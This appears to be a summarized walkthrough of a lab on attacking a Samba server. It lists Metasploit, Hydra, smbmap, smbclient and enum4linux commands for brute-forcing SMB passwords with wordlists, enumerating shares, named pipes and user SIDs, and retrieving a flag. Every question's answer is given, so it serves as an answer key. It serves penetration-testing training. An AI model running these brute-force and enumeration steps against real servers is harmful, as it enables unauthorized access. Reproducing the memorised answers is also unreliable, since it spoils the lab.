Here are the summarized steps from the document in bullet points:

**Q1. What is the password of user “jane” required to access share “jane”? Use smb_login Metasploit module with a password wordlist.**

- Commands:
    - Start Metasploit console: `msfconsole`
    - Use SMB login scanner: `use auxiliary/scanner/smb/smb_login`
    - Set the password wordlist: `set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt`
    - Set SMB user and target IP: `set SMBUser jane` and `set RHOSTS 192.212.251.3`
    - Exploit to find the password: `exploit`
- Answer: abc123

**Q2. What is the password of user “admin” required to access share “admin”? Use Hydra with a password wordlist.**

- Commands:
    - Decompress the wordlist: `gzip -d /usr/share/wordlists/rockyou.txt.gz`
    - Use Hydra to perform a dictionary attack: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.212.251.3 smb`
- Answer: password1

**Q3. Which share is read-only? Use smbmap with credentials obtained in question 2.**

- Command: `smbmap -H 192.212.251.3 -u admin -p password1`
- Answer: nancy

**Q4. Is share “jane” browseable? Use credentials obtained from the 1st question.**

- Commands:
    - List shares: `smbclient -L 192.212.251.3 -U jane`
    - Check if share "jane" exists and is browsable: `smbclient //192.212.251.3/jane -U jane`
- Answer: no

**Q5. Fetch the flag from share “admin”.**

- Commands:
    - Access the share: `smbclient //192.212.251.3/admin -U admin`
    - Navigate to the "hidden" directory and retrieve the flag: `ls`, `cd hidden`, `ls`, `get flag.tar.gz`
    - Extract and display the flag: `exit`, `tar -xf flag.tar.gz`, `cat flag`
- Answer: 2727069bc058053bd561ce372721c92e

**Q6. List the named pipes available over SMB on the Samba server? Use pipe_auditor Metasploit module with credentials obtained from question 2.**

- Commands:
    - Start Metasploit console: `msfconsole`
    - Use SMB pipe auditor: `use auxiliary/scanner/smb/pipe_auditor`
    - Set SMB user, password, and target IP: `set SMBUser admin`, `set SMBPass password1`, `set RHOSTS 192.212.251.3`
    - Exploit to list named pipes: `exploit`
- Answer: netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc

**Q7. List the SID of Unix users shawn, jane, nancy, and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.**

- Command: `enum4linux -r -u "admin" -p "password1" 192.212.251.3`
- Answers: S-1-22-1-1000, S-1-22-1-1001, S-1-22-1-1002, S-1-22-1-1003

These steps cover the process of identifying passwords, share permissions, retrieving flags, listing named pipes, and obtaining SIDs from the Samba server.
